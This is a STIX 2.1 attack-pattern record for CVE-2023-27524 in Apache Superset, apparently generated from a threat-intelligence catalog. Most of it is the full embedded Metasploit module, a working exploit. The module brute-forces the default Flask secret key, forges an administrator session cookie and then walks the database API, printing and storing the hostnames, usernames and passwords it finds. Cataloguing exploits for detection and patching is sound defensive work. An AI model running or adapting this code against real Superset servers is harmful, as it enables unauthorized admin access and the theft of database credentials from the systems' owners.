{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--91a34e78-a1a7-420e-9a8a-09e866d39907",
    "created": "2024-08-14T16:31:58.774078Z",
    "modified": "2024-08-14T16:31:58.774082Z",
    "name": "Apache Superset Signed Cookie Priv Esc",
    "description": " Apache Superset versions <= 2.0.0 utilize Flask with a known default secret key which is used to sign HTTP cookies. These cookies can therefore be forged. If a user is able to login to the site, they can decode the cookie, set their user_id to that of an administrator, and re-sign the cookie. This valid cookie can then be used to login as the targeted user and retrieve database credentials saved in Apache Superset. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/apache_superset_cookie_sig_priv_esc.rb",
            "external_id": "apache_superset_cookie_sig_priv_esc.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/Paradoxis/Flask-Unsign"
        },
        {
            "source_name": "reference",
            "url": "https://vulcan.io/blog/cve-2023-27524-in-apache-superset-what-you-need-to-know/"
        },
        {
            "source_name": "reference",
            "url": "https://www.horizon3.ai/cve-2023-27524-insecure-default-configuration-in-apache-superset-leads-to-remote-code-execution/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/horizon3ai/CVE-2023-27524/blob/main/CVE-2023-27524.py"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-27524"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Apache Superset Signed Cookie Priv Esc',\n        'Description' => %q{\n          Apache Superset versions <= 2.0.0 utilize Flask with a known default secret key which is used to sign HTTP cookies.\n          These cookies can therefore be forged. If a user is able to login to the site, they can decode the cookie, set their user_id to that\n          of an administrator, and re-sign the cookie. This valid cookie can then be used to login as the targeted user and retrieve database\n          credentials saved in Apache Superset.\n        },\n        'Author' => [\n          'h00die', # MSF module\n          'paradoxis', #  original flask-unsign tool\n          'Spencer McIntyre', # MSF flask-unsign library\n          'Naveen Sunkavally' # horizon3.ai writeup and cve discovery\n        ],\n        'References' => [\n          ['URL', 'https://github.com/Paradoxis/Flask-Unsign'],\n          ['URL', 'https://vulcan.io/blog/cve-2023-27524-in-apache-superset-what-you-need-to-know/'],\n          ['URL', 'https://www.horizon3.ai/cve-2023-27524-insecure-default-configuration-in-apache-superset-leads-to-remote-code-execution/'],\n          ['URL', 'https://github.com/horizon3ai/CVE-2023-27524/blob/main/CVE-2023-27524.py'],\n          ['EDB', '51447'],\n          ['CVE', '2023-27524' ],\n        ],\n        'License' => MSF_LICENSE,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => [IOC_IN_LOGS],\n          'RelatedModules' => ['exploit/linux/http/apache_superset_cookie_sig_rce']\n        },\n        'DisclosureDate' => '2023-04-25'\n      )\n    )\n    register_options(\n      [\n        Opt::RPORT(8088),\n        OptString.new('USERNAME', [true, 'The username to authenticate as', nil]),\n        OptString.new('PASSWORD', [true, 'The password for the specified username', nil]),\n        OptInt.new('ADMIN_ID', [true, 'The ID of an admin account', 1]),\n        OptString.new('TARGETURI', [ true, 'Relative URI of Apache Superset installation', '/']),\n        OptPath.new('SECRET_KEYS_FILE', [\n          false, 'File containing secret keys to try, one per line',\n          File.join(Msf::Config.data_directory, 'wordlists', 'superset_secret_keys.txt')\n        ]),\n      ]\n    )\n  end\n\n  def check\n    res = send_request_cgi!({\n      'uri' => normalize_uri(target_uri.path, 'login')\n    })\n    return Exploit::CheckCode::Unknown(\"#{peer} - Could not connect to web service - no response\") if res.nil?\n    return Exploit::CheckCode::Unknown(\"#{peer} - Unexpected response code (#{res.code})\") unless res.code == 200\n    return Exploit::CheckCode::Safe(\"#{peer} - Unexpected response, version_string not detected\") unless res.body.include? 'version_string'\n    unless res.body =~ /&#34;version_string&#34;: &#34;([\\d.]+)&#34;/\n      return Exploit::CheckCode::Safe(\"#{peer} - Unexpected response, unable to determine version_string\")\n    end\n\n    version = Rex::Version.new(Regexp.last_match(1))\n    if version < Rex::Version.new('2.0.1') && version >= Rex::Version.new('1.4.1')\n      Exploit::CheckCode::Appears(\"Apache Supset #{version} is vulnerable\")\n    else\n      Exploit::CheckCode::Safe(\"Apache Supset #{version} is NOT vulnerable\")\n    end\n  end\n\n  def get_secret_key(cookie)\n    File.open(datastore['SECRET_KEYS_FILE'], 'rb').each do |secret|\n      secret = secret.strip\n      vprint_status(\"#{peer} - Checking secret key: #{secret}\")\n\n      unescaped_secret = Rex::Text.dehex(secret.gsub('\\\\', '\\\\').gsub('\\\\n', \"\\n\").gsub('\\\\t', \"\\t\"))\n      unless Msf::Exploit::Remote::HTTP::FlaskUnsign::Session.valid?(cookie, unescaped_secret)\n        vprint_bad(\"#{peer} - Incorrect secret key: #{secret}\")\n        next\n      end\n\n      print_good(\"#{peer} - Found secret key: #{secret}\")\n      return secret\n    end\n    nil\n  end\n\n  def validate_cookie(decoded_cookie, secret_key)\n    print_status(\"#{peer} - Attempting to resign with key: #{secret_key}\")\n    encoded_cookie = Msf::Exploit::Remote::HTTP::FlaskUnsign::Session.sign(decoded_cookie, secret_key)\n\n    print_status(\"#{peer} - New signed cookie: #{encoded_cookie}\")\n    cookie_jar.clear\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'api', 'v1', 'me', '/'),\n      'cookie' => \"session=#{encoded_cookie};\",\n      'keep_cookies' => true\n    )\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n    if res.code == 401\n      print_bad(\"#{peer} - Cookie not accepted\")\n      return nil\n    end\n    data = res.get_json_document\n    print_good(\"#{peer} - Cookie validated to user: #{data['result']['username']}\")\n    return encoded_cookie\n  end\n\n  def run\n    res = send_request_cgi!({\n      'uri' => normalize_uri(target_uri.path, 'login'),\n      'keep_cookies' => true\n    })\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Unexpected response code (#{res.code})\") unless res.code == 200\n\n    fail_with(Failure::NotFound, 'Unable to determine csrf token') unless res.body =~ /name=\"csrf_token\" type=\"hidden\" value=\"([\\w.-]+)\">/\n\n    csrf_token = Regexp.last_match(1)\n    vprint_status(\"#{peer} - CSRF Token: #{csrf_token}\")\n    cookie = res.get_cookies.to_s\n    print_status(\"#{peer} - Initial Cookie: #{cookie}\")\n    decoded_cookie = Msf::Exploit::Remote::HTTP::FlaskUnsign::Session.decode(cookie.split('=')[1].gsub(';', ''))\n    print_status(\"#{peer} - Decoded Cookie: #{decoded_cookie}\")\n    print_status(\"#{peer} - Attempting login\")\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'login', '/'),\n      'keep_cookies' => true,\n      'method' => 'POST',\n      'ctype' => 'application/x-www-form-urlencoded',\n      'vars_post' => {\n        'username' => datastore['USERNAME'],\n        'password' => datastore['PASSWORD'],\n        'csrf_token' => csrf_token\n      }\n    })\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n    fail_with(Failure::NoAccess, \"#{peer} - Failed login\") if res.body.include? 'Sign In'\n    cookie = res.get_cookies.to_s\n    print_good(\"#{peer} - Logged in Cookie: #{cookie}\")\n\n    # get the cookie value and strip off anything else\n    cookie = cookie.split('=')[1].gsub(';', '')\n\n    secret_key = get_secret_key(cookie)\n    fail_with(Failure::NotFound, 'Unable to find secret key') if secret_key.nil?\n\n    decoded_cookie = Msf::Exploit::Remote::HTTP::FlaskUnsign::Session.decode(cookie)\n    decoded_cookie['user_id'] = datastore['ADMIN_ID']\n    print_status(\"#{peer} - Modified cookie: #{decoded_cookie}\")\n    admin_cookie = validate_cookie(decoded_cookie, secret_key)\n\n    fail_with(Failure::NoAccess, \"#{peer} - Unable to sign cookie with a valid secret\") if admin_cookie.nil?\n    (1..101).each do |i|\n      res = send_request_cgi(\n        'uri' => normalize_uri(target_uri.path, 'api', 'v1', 'database', i),\n        'cookie' => \"session=#{admin_cookie};\",\n        'keep_cookies' => true\n      )\n      fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n      if res.code == 401 || res.code == 404\n        print_status('Done enumerating databases')\n        break\n      end\n      result_json = res.get_json_document\n      db_display_name = result_json['result']['database_name']\n      db_name = result_json['result']['parameters']['database']\n      db_type = result_json['result']['backend']\n      db_host = result_json['result']['parameters']['host']\n      db_port = result_json['result']['parameters']['port']\n      db_pass = result_json['result']['parameters']['password']\n      db_user = result_json['result']['parameters']['username']\n      if framework.db.active\n        create_credential_and_login({\n          address: db_host,\n          port: db_port,\n          protocol: 'tcp',\n          workspace_id: myworkspace_id,\n          origin_type: :service,\n          service_name: db_type,\n          username: db_user,\n          private_type: :password,\n          private_data: db_pass,\n          module_fullname: fullname,\n          status: Metasploit::Model::Login::Status::UNTRIED\n        })\n      end\n      print_good(\"Found #{db_display_name}: #{db_type}://#{db_user}:#{db_pass}@#{db_host}:#{db_port}/#{db_name}\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2023-04-25"
}